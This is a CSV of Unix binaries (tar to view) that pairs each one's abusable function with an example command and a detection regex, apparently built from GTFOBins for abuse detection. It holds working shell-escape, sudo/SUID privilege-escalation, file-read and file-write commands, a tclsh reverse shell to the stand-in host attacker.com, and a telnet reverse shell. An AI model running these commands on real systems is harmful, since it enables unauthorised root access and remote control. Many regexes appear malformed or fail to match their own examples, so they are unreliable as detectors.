Name,Function,ExampleCode,Regex,Notes
tar,shell,"tar xf /dev/null -I '/bin/sh -c ""sh <&2 1>&2""'",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?tar\s*\-I\s*\-c\s+(?:/bin/(?:sh|bash))),
tar,shell,"echo '/bin/sh 0<&1' > ""$TF""
tar cf ""$TF.tar"" ""$TF""
tar xf ""$TF.tar"" --to-command sh
rm ""$TF""*","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?tar\s*\-\-to\-command\s+(?:/bin/(?:sh|bash)).*(?:--to-command\b|--checkpoint-action\b|--checkpoint\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
tar,file-upload,tar cvf $RUSER@$RHOST:$RFILE $LFILE --rsh-command=/bin/ssh,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?tar\s*\-\-rsh\-command\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
tar,file-download,tar xvf $RUSER@$RHOST:$RFILE --rsh-command=/bin/ssh,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?tar\s*\-\-rsh\-command\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
tar,file-write,"echo DATA > ""$TF""
tar c --xform ""s@.*@$LFILE@"" -OP ""$TF"" | tar x -P","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?tar\s*\-\-xform\s*\-P\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
tar,file-read,"tar xf ""$LFILE"" -I '/bin/sh -c ""cat 1>&2""'","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?tar\s*\-I\s*\-c\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
tar,sudo,sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?tar\s*\-\-checkpoint\s*\-\-checkpoint\-action\s+(?:/bin/(?:sh|bash)).*(?:--to-command\b|--checkpoint-action\b|--checkpoint\b)),
tar,limited-suid,./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?tar\s*\-\-checkpoint\s*\-\-checkpoint\-action\s+(?:/bin/(?:sh|bash)).*(?:--to-command\b|--checkpoint-action\b|--checkpoint\b)),
task,shell,task execute /bin/sh,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?task\s+(?:/bin/(?:sh|bash))),
task,sudo,sudo task execute /bin/sh,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?task\s+(?:/bin/(?:sh|bash))),
taskset,shell,taskset 1 /bin/sh,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?taskset\s+(?:/bin/(?:sh|bash))),
taskset,suid,./taskset 1 /bin/sh -p,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?taskset\s*\-p\s+(?:/bin/(?:sh|bash))),
taskset,sudo,sudo taskset 1 /bin/sh,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?taskset\s+(?:/bin/(?:sh|bash))),
tasksh,shell,"tasksh
!/bin/sh",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?tasksh\s+(?:/bin/(?:sh|bash))),
tasksh,limited-suid,"./tasksh
!/bin/sh",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?tasksh\s+(?:/bin/(?:sh|bash))),
tasksh,sudo,"sudo tasksh
!/bin/sh",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?tasksh\s+(?:/bin/(?:sh|bash))),
tbl,file-read,tbl $LFILE,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?tbl\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
tbl,suid,./tbl $LFILE,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?tbl\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
tbl,sudo,sudo tbl $LFILE,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?tbl\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
tclsh,shell,"tclsh
exec /bin/sh <@stdin >@stdout 2>@stderr",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?tclsh\s+(?:/bin/(?:sh|bash))),
tclsh,non-interactive-reverse-shell,"export RHOST=attacker.com
export RPORT=12345
echo 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s ""> "";flush $s;gets $s c;set e ""exec $c"";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?tclsh\s+(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
tclsh,suid,"./tclsh
exec /bin/sh -p <@stdin >@stdout 2>@stderr",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?tclsh\s*\-p\s+(?:/bin/(?:sh|bash))),
tclsh,sudo,"sudo tclsh
exec /bin/sh <@stdin >@stdout 2>@stderr",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?tclsh\s+(?:/bin/(?:sh|bash))),
tcpdump,command,"echo ""$COMMAND"" > $TF
chmod +x $TF
tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?tcpdump\s*\-i\s*\-w\s*\-W\s*\-G\s*\-z\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
tcpdump,sudo,"echo ""$COMMAND"" > $TF
chmod +x $TF
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?tcpdump\s*\-i\s*\-w\s*\-W\s*\-G\s*\-z\s*\-Z\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
tdbtool,shell,"tdbtool
! /bin/sh",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?tdbtool\s+(?:/bin/(?:sh|bash))),
tdbtool,sudo,"sudo tdbtool
! /bin/sh",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?tdbtool\s+(?:/bin/(?:sh|bash))),
tdbtool,limited-suid,"./tdbtool
! /bin/sh",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?tdbtool\s+(?:/bin/(?:sh|bash))),
tee,file-write,"echo DATA | ./tee -a ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?tee\s*\-a\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
tee,suid,"echo DATA | ./tee -a ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?tee\s*\-a\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
tee,sudo,"echo DATA | sudo tee -a ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?tee\s*\-a\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
telnet,shell,"telnet $RHOST $RPORT
^]
!/bin/sh","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?telnet\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
telnet,reverse-shell,mkfifo $TF && telnet $RHOST $RPORT 0<$TF | /bin/sh 1>$TF,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?telnet\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
telnet,sudo,"sudo telnet $RHOST $RPORT
^]
!/bin/sh","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?telnet\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
telnet,limited-suid,"./telnet $RHOST $RPORT
^]
!/bin/sh","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?telnet\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
terraform,file-read,"terraform console
file(""file_to_read"")","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?terraform\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
terraform,sudo,"sudo terraform console
file(""file_to_read"")","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?terraform\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
terraform,suid,"./terraform console
file(""file_to_read"")","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?terraform\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
tex,shell,tex --shell-escape '\write18{/bin/sh}\end',(?:?i)(?:(?:sudo\s+)?(?:\S*/)?tex\s*\-\-shell\-escape\s+(?:/bin/(?:sh|bash))),
tex,sudo,sudo tex --shell-escape '\write18{/bin/sh}\end',(?:?i)(?:(?:sudo\s+)?(?:\S*/)?tex\s*\-\-shell\-escape\s+(?:/bin/(?:sh|bash))),
tex,limited-suid,./tex --shell-escape '\write18{/bin/sh}\end',(?:?i)(?:(?:sudo\s+)?(?:\S*/)?tex\s*\-\-shell\-escape\s+(?:/bin/(?:sh|bash))),
tftp,file-upload,"tftp $RHOST
put file_to_send","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?tftp\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
tftp,file-download,"tftp $RHOST
get file_to_get","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?tftp\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
tftp,suid,"./tftp $RHOST
put file_to_send","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?tftp\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
tftp,sudo,"sudo tftp $RHOST
put file_to_send","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?tftp\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
tic,file-read,"tic -C ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?tic\s*\-C\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
tic,suid,"./tic -C ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?tic\s*\-C\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
tic,sudo,"sudo tic -C ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?tic\s*\-C\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
time,shell,/usr/bin/time /bin/sh,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?time\s+(?:/bin/(?:sh|bash))),
time,suid,./time /bin/sh -p,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?time\s*\-p\s+(?:/bin/(?:sh|bash))),
time,sudo,sudo /usr/bin/time /bin/sh,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?time\s+(?:/bin/(?:sh|bash))),
timedatectl,shell,"timedatectl list-timezones
!/bin/sh",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?timedatectl\s+(?:/bin/(?:sh|bash))),
timedatectl,sudo,"sudo timedatectl list-timezones
!/bin/sh",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?timedatectl\s+(?:/bin/(?:sh|bash))),
timeout,shell,timeout 7d /bin/sh,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?timeout\s+(?:/bin/(?:sh|bash))),
timeout,suid,./timeout 7d /bin/sh -p,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?timeout\s*\-p\s+(?:/bin/(?:sh|bash))),
timeout,sudo,sudo timeout --foreground 7d /bin/sh,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?timeout\s*\-\-foreground\s+(?:/bin/(?:sh|bash))),
tmate,shell,tmate -c /bin/sh,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?tmate\s*\-c\s+(?:/bin/(?:sh|bash))),
tmate,sudo,sudo tmate -c /bin/sh,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?tmate\s*\-c\s+(?:/bin/(?:sh|bash))),
tmate,limited-suid,./tmate -c /bin/sh,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?tmate\s*\-c\s+(?:/bin/(?:sh|bash))),
tmux,file-read,tmux -f $LFILE,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?tmux\s*\-f\s+(?:-F\b|--form\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
tmux,shell,tmux,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?tmux\s+.+),
tmux,shell,tmux -S /path/to/socket_name,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?tmux\s*\-S\s+.+),
tmux,sudo,sudo tmux,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?tmux\s+.+),
top,shell,"echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc
top
reset",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?top\s*\-e\s+(?:/bin/(?:sh|bash))),
top,sudo,"echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>/root/.config/procps/toprc
sudo top
reset",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?top\s*\-e\s+(?:/bin/(?:sh|bash))),
torify,shell,torify /bin/sh,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?torify\s+(?:/bin/(?:sh|bash))),
torify,sudo,sudo torify /bin/sh,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?torify\s+(?:/bin/(?:sh|bash))),
torsocks,shell,torsocks /bin/sh,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?torsocks\s+(?:/bin/(?:sh|bash))),
torsocks,sudo,sudo torsocks /bin/sh,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?torsocks\s+(?:/bin/(?:sh|bash))),
troff,file-read,troff $LFILE,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?troff\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
troff,suid,./troff $LFILE,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?troff\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
troff,sudo,sudo troff $LFILE,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?troff\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
tshark,shell,"echo 'os.execute(""/bin/sh"")' >$TF
tshark -Xlua_script:$TF","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?tshark\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ul,file-read,"ul ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?ul\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ul,suid,"./ul ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?ul\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ul,sudo,"sudo ul ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?ul\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
unexpand,file-read,"unexpand -t99999999 ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?unexpand\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
unexpand,suid,"./unexpand -t99999999 ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?unexpand\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
unexpand,sudo,"sudo unexpand -t99999999 ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?unexpand\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
uniq,file-read,"uniq ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?uniq\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
uniq,suid,"./uniq ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?uniq\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
uniq,sudo,"sudo uniq ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?uniq\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
unshare,shell,unshare /bin/sh,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?unshare\s+(?:/bin/(?:sh|bash))),
unshare,suid,./unshare -r /bin/sh,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?unshare\s*\-r\s+(?:/bin/(?:sh|bash))),
unshare,sudo,sudo unshare /bin/sh,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?unshare\s+(?:/bin/(?:sh|bash))),
unsquashfs,sudo,"sudo unsquashfs shell
./squashfs-root/sh -p",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?unsquashfs\s*\-p\s+.+),
unsquashfs,suid,"./unsquashfs shell
./squashfs-root/sh -p",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?unsquashfs\s*\-p\s+.+),
unzip,sudo,"sudo unzip -K shell.zip
./sh -p",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?unzip\s*\-K\s*\-p\s+.+),
unzip,suid,"./unzip -K shell.zip
./sh -p",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?unzip\s*\-K\s*\-p\s+.+),
update-alternatives,sudo,"echo DATA >$TF
sudo update-alternatives --force --install ""$LFILE"" x ""$TF"" 0","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?update\-alternatives\s*\-\-force\s*\-\-install\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
update-alternatives,suid,"echo DATA >$TF
./update-alternatives --force --install ""$LFILE"" x ""$TF"" 0","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?update\-alternatives\s*\-\-force\s*\-\-install\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
uudecode,file-read,"uuencode ""$LFILE"" /dev/stdout | uudecode","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?uudecode\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
uudecode,suid,"uuencode ""$LFILE"" /dev/stdout | uudecode","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?uudecode\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
uudecode,sudo,"sudo uuencode ""$LFILE"" /dev/stdout | uudecode","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?uudecode\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
uuencode,file-read,"uuencode ""$LFILE"" /dev/stdout | uudecode","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?uuencode\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
uuencode,suid,"uuencode ""$LFILE"" /dev/stdout | uudecode","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?uuencode\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
uuencode,sudo,"sudo uuencode ""$LFILE"" /dev/stdout | uudecode","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?uuencode\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
vagrant,shell,"cd $(mktemp -d)
echo 'exec ""/bin/sh""' > Vagrantfile
vagrant up",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?vagrant\s*\-d\s+(?:/bin/(?:sh|bash)).*(?:--data\b|--data-raw\b|-d\b)),
vagrant,sudo,"cd $(mktemp -d)
echo 'exec ""/bin/sh""' > Vagrantfile
vagrant up",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?vagrant\s*\-d\s+(?:/bin/(?:sh|bash)).*(?:--data\b|--data-raw\b|-d\b)),
vagrant,suid,"cd $(mktemp -d)
echo 'exec ""/bin/sh -p""' > Vagrantfile
vagrant up",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?vagrant\s*\-d\s*\-p\s+(?:/bin/(?:sh|bash)).*(?:--data\b|--data-raw\b|-d\b)),
valgrind,shell,valgrind /bin/sh,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?valgrind\s+(?:/bin/(?:sh|bash))),
valgrind,sudo,sudo valgrind /bin/sh,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?valgrind\s+(?:/bin/(?:sh|bash))),
varnishncsa,sudo,"sudo varnishncsa -g request -q 'ReqURL ~ ""/xxx""' -F '%{yyy}i' -w ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?varnishncsa\s*\-g\s*\-q\s*\-F\s*\-w\s+(?:-F\b|--form\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
varnishncsa,suid,"./varnishncsa -g request -q 'ReqURL ~ ""/xxx""' -F '%{yyy}i' -w ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?varnishncsa\s*\-g\s*\-q\s*\-F\s*\-w\s+(?:-F\b|--form\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
vi,shell,vi -c ':!/bin/sh' /dev/null,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?vi\s*\-c\s+(?:/bin/(?:sh|bash))),
vi,shell,"vi
:set shell=/bin/sh
:shell",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?vi\s+(?:/bin/(?:sh|bash))),
vi,file-write,"vi file_to_write
iDATA
^[
w",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?vi\s+.+),
vi,file-read,vi file_to_read,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?vi\s+.+),
vi,sudo,sudo vi -c ':!/bin/sh' /dev/null,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?vi\s*\-c\s+(?:/bin/(?:sh|bash))),
view,shell,view -c ':!/bin/sh',(?:?i)(?:(?:sudo\s+)?(?:\S*/)?view\s*\-c\s+(?:/bin/(?:sh|bash))),
view,shell,"view
:set shell=/bin/sh
:shell",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?view\s+(?:/bin/(?:sh|bash))),
view,shell,"view -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?view\s*\-c\s+(?:/bin/(?:sh|bash)).*(?:\bimport\b)),
view,shell,"view -c ':lua os.execute(""reset; exec sh"")'",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?view\s*\-c\s+.+),
